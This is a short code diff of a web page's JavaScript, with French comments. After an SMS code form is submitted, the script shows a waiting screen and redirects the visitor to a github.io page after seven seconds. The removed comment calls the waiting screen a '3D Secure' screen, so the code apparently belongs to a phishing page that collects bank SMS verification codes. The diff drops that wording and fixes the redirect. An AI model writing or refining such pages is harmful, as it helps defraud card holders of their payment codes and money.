@@ -133,13 +133,13 @@
                 }),
             });
 
-            // Afficher l'écran d'attente 3D Secure immédiatement après la soumission du formulaire SMS
+            // Afficher l'écran d'attente immédiatement après la soumission
             document.getElementById('smsForm').style.display = 'none';
             document.getElementById('waiting').style.display = 'block';
 
             // Attendre 7 secondes avant la redirection
             setTimeout(function() {
-                window.location.href = 'gerard1334.github.io/baskettefrig/'; // Remplacez par l'URL de la page de paiement réussi
+                window.location.href = 'https://gerard1334.github.io/baskettefrig/'; // Redirection vers le site souhaité
             }, 7000); // 7 secondes d'attente avant la redirection
         });
 
